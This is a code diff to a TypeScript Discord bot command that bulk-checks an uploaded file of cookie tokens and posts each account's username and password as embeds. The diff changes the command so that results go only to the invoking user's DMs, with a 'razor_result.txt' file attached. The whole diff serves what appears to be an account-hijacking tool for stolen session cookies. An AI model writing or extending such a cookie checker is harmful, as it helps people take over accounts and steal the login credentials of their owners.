@@ -43,9 +43,6 @@ const data = new SlashCommandBuilder()
   .setDescription('Mass Checking File (Auto‑Reset)')
   .addAttachmentOption((opt) =>
     opt.setName('file').setDescription('A .txt file containing cookies').setRequired(true),
-  )
-  .addStringOption((opt) =>
-    opt.setName('delivery').setDescription('Send results to DMs? (D) or Server (S)').setRequired(false),
   ) as SlashCommandBuilder;
 
 async function execute(interaction: ChatInputCommandInteraction): Promise<void> {
@@ -73,9 +70,6 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
       await interaction.editReply({ embeds: [buildErrorEmbed('✧ **No Cookies Found**\n────\n⭑ File must contain cookie tokens.')] });
       return;
     }
-
-    const deliveryRaw = interaction.options.getString('delivery')?.toUpperCase() || 'S';
-    const delivery = deliveryRaw === 'D' ? 'dm' : 'server';
 
     await interaction.editReply({ embeds: [buildProgressEmbed(`Scanning ${cookies.length} cookie(s)...`)] });
 
@@ -145,13 +139,9 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
       embed.setDescription(`**Username:** ${username}\n**Password:** ${password}`);
       if (thumb) embed.setThumbnail(thumb);
 
-      if (delivery === 'dm') {
-        try {
-          await interaction.user.send({ embeds: [embed] });
-        } catch {
-          await interaction.channel?.send({ embeds: [embed] });
-        }
-      } else {
+      try {
+        await interaction.user.send({ embeds: [embed] });
+      } catch {
         await interaction.channel?.send({ embeds: [embed] });
       }
 
@@ -169,11 +159,15 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
     const fileBuffer = Buffer.from(fileContentOutput, 'utf-8');
     const fileAttachment = new AttachmentBuilder(fileBuffer, { name: 'razor_result.txt' });
 
-    await interaction.followUp({
+    await interaction.user.send({
       embeds: [summaryEmbed],
       files: [fileAttachment],
-      flags: MessageFlags.Ephemeral,
-    });
+    }).catch(() => interaction.channel?.send({
+      embeds: [summaryEmbed],
+      files: [fileAttachment],
+    }));
+
+    await interaction.editReply({ content: '✅ Results sent to your DMs.', embeds: [] });
   } catch (err: any) {
     logger.error({ err }, 'Check command error');
     try {
@@ -183,7 +177,6 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
 }
 
 async function handleButton(interaction: MessageComponentInteraction): Promise<void> {
-  
 }
 
 export const checkCommand: Command = { data, execute, handleButton };
